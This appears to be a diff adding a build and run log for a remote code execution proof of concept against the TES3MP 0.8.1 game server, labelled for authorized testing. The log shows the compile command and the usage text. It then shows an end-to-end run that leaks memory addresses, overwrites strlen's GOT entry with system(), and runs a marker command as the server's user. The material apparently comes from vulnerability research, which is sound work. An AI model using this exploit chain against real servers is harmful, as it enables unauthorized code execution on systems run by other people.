@@ -1,0 +1,27 @@
+=== make (fresh: configure+build CrabNet, then the exploit) ===
+gmake[3]: Leaving directory '/tmp/cleanbuild/rce-clone-test/third_party/CrabNet/build'
+gmake[2]: Leaving directory '/tmp/cleanbuild/rce-clone-test/third_party/CrabNet/build'
+gmake[1]: Leaving directory '/tmp/cleanbuild/rce-clone-test/third_party/CrabNet/build'
+g++ -O2 -w -std=c++17 -Ithird_party/CrabNet/include/raknet -Ithird_party/tes3mp           src/tes3mp-rce.cc -o tes3mp-rce -Lthird_party/CrabNet/build/lib/ -lRakNetLibStatic -lpthread
+built ./tes3mp-rce - run './tes3mp-rce --help'
+=== result ===
+-rwxrwxr-x 1 eli eli 1836880 Aug 17 19:59 ./tes3mp-rce
+tes3mp-rce - remote code execution PoC for TES3MP 0.8.1 (authorized testing only)
+
+usage: ./tes3mp-rce [options] <host> [port]
+
+  -P, --server-password <pw>  server password, i.e. the `password` setting in
+                              tes3mp-server-default.cfg. Default: empty (upstream default).
+
+===== END-TO-END WITH THE SELF-CONTAINED BUILD =====
+cfg: [password = <server-password>]
+=== running the SELF-CONTAINED build (make-from-clean-clone binary) ===
+[+] image base           0x55ef89d8a000  (page aligned)
+[+] libc base            0x7315b3e00000  (page aligned)
+[+] system()             0x7315b3e58750
+[+] strlen@got           0x55ef8a04d1f8
+[+] trigger sent: strlen@got <- system, then strlen("touch /tmp/final-proof")
+[*] done. If the target is vulnerable the command has run as the server's user.
+=== MARKER: *** EXISTS - self-contained build works end to end *** ===
+-rw-rw-r-- 1 fuzzer fuzzer 0 Aug 17 20:00 /tmp/final-proof
+cfg restored: [password =]
